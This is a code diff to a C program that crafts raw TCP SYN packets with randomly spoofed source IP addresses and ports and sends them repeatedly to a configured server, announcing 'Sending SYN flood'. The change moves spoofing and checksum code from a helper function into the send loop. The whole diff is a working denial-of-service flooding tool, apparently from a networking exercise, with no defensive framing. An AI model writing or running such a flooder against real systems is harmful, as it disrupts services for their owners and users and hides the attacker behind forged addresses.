@@ -57,20 +57,8 @@ double current_timestamp_ms()
     return ts.tv_sec * 1000.0 + ts.tv_nsec / 1000000.0;
 }
 
-void handle_packet(char *packet,struct iphdr *iph, struct tcphdr *tcph)
+void handle_packet(char *packet,struct iphdr *iph, struct tcphdr *tcph, struct pseudo_header *psh)
 {
-    struct pseudo_header psh;
-    int mask1, mask2, mask3, mask4; // Will be used to create a random IP address
-
-    // Generate random source IP address
-    mask1 = rand() % MASK;
-    mask2 = rand() % MASK;
-    mask3 = rand() % MASK;
-    mask4 = rand() % MASK;
-    char src_ip[16];
-    snprintf(src_ip, sizeof(src_ip), "%d.%d.%d.%d", mask1, mask2, mask3, mask4); // Random source IP
-
-    int source_port = (rand() % (65535 - 1024)) + 1024; // Random source port
 
     // Create IP Header
     iph->ihl = 5;                                                // Internet Header Length
@@ -78,17 +66,13 @@ void handle_packet(char *packet,struct iphdr *iph, struct tcphdr *tcph)
     iph->tos = 0;                                                // Type of Service
     iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr); // Total length of the packet
     iph->id = htonl(54321);                                      // Id of this packet
-    iph->frag_off = 0;                 // Fragmentation offset
-    iph->ttl = 255;                    // Time to live
-    iph->protocol = IPPROTO_TCP;       // Protocol
-    iph->check = 0;                    // Set to 0 before calculating checksum
-    iph->saddr = inet_addr(src_ip);    // Source IP
-    iph->daddr = inet_addr(SERVER_IP); // Destination IP
-
-    iph->check = checksum((unsigned short *)packet, iph->tot_len); // Calculate checksum for the IP header
+    iph->frag_off = 0;                                           // Fragmentation offset
+    iph->ttl = 255;                                              // Time to live
+    iph->protocol = IPPROTO_TCP;                                 // Protocol
+    iph->check = 0;                                              // Set to 0 before calculating checksum
+    iph->daddr = inet_addr(SERVER_IP);                           // Destination IP
 
     // Create TCP Header
-    tcph->source = htons(source_port); // Source port
     tcph->dest = htons(SERVER_PORT);   // Destination port
     tcph->seq = 0;                     // Sequence number of the packet (doesn't matter in our case)
     tcph->ack_seq = 0;                 // Acknowledgement number of the packet (doesn't matter in our case)
@@ -99,26 +83,15 @@ void handle_packet(char *packet,struct iphdr *iph, struct tcphdr *tcph)
     tcph->psh = 0;
     tcph->ack = 0; 
     tcph->urg = 0;
-    tcph->window = htons(5840); // maximum allowed window size
-    tcph->check = 0;            // Checksum will be filled later by pseudo header
+    tcph->window = htons(5840);         // maximum allowed window size
+    tcph->check = 0;                    // Checksum will be filled later by pseudo header
     tcph->urg_ptr = 0;
 
     // Assign values to pseudo header
-    psh.source_address = inet_addr(src_ip);
-    psh.dest_address = inet_addr(SERVER_IP);
-    psh.placeholder = 0;
-    psh.protocol = IPPROTO_TCP;
-    psh.tcp_length = htons(sizeof(struct tcphdr));  // IP Header include TCP Header size
-
-    int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr);   // Size of pseudo header
-    char *pseudo_packet = (char *)malloc(psize);    // pseudo packet mimics the original packet, to calculate checksum
-
-    memcpy(pseudo_packet, (char *)&psh, sizeof(struct pseudo_header));                  // Copy pseudo header to the packet
-    memcpy(pseudo_packet + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr));  // Copy TCP header to the packet
-
-    tcph->check = checksum((unsigned short *)pseudo_packet, psize); // Calculate checksum and assign to TCP header
-    
-    free(pseudo_packet);
+    psh->dest_address = inet_addr(SERVER_IP);
+    psh->placeholder = 0;
+    psh->protocol = IPPROTO_TCP;
+    psh->tcp_length = htons(sizeof(struct tcphdr));  // IP Header include TCP Header size
 }
 
 int main()
@@ -170,6 +143,8 @@ int main()
     // Set pointers to the IP header and TCP header in the packet
     struct iphdr *iph = (struct iphdr *)packet;
     struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr)); // TCP Header comes after the IP header
+    struct pseudo_header psh;
+    handle_packet(packet,iph,tcph, &psh); // Handle the packet (Assign values to IP and TCP headers)
 
     printf("Sending SYN flood to %s:%d\n", SERVER_IP, SERVER_PORT);
 
@@ -177,8 +152,39 @@ int main()
     {
         for (size_t i = 0; i < NUM_OF_TRIES; i++)
         {
-            handle_packet(packet,iph,tcph); // Handle the packet (Assign values to IP and TCP headers)
+            // Defenitions that change for each iteration:
+            int mask1, mask2, mask3, mask4; // Will be used to create a random IP address
 
+            // Generate random source IP address
+            mask1 = rand() % MASK;
+            mask2 = rand() % MASK;
+            mask3 = rand() % MASK;
+            mask4 = rand() % MASK;
+            char src_ip[16];
+            snprintf(src_ip, sizeof(src_ip), "%d.%d.%d.%d", mask1, mask2, mask3, mask4); // Random source IP
+
+            int source_port = (rand() % (65535 - 1024)) + 1024; // Random source port
+
+            // Assign values to the IP header
+            iph->saddr = inet_addr(src_ip);                                // Source IP
+            iph->check = checksum((unsigned short *)packet, iph->tot_len); // Calculate checksum for the IP header
+
+            // Assign values to the TCP header
+            tcph->source = htons(source_port);                             // Source port
+
+            // Assign values to the pseudo header
+            psh.source_address = inet_addr(src_ip);                        // Source IP for pseudo header
+
+            // Create a pseudo packet to calculate checksum
+            int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr);   // Size of pseudo header
+            char *pseudo_packet = (char *)malloc(psize);    // pseudo packet mimics the original packet, to calculate checksum
+            memcpy(pseudo_packet, (char *)&psh, sizeof(struct pseudo_header));                  // Copy pseudo header to the packet
+            memcpy(pseudo_packet + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr));  // Copy TCP header to the packet
+
+            tcph->check = checksum((unsigned short *)pseudo_packet, psize); // Calculate checksum and assign to TCP header
+            
+            free(pseudo_packet);
+            
             // Define the destination address
             struct sockaddr_in dest;                     
             dest.sin_family = AF_INET;                      
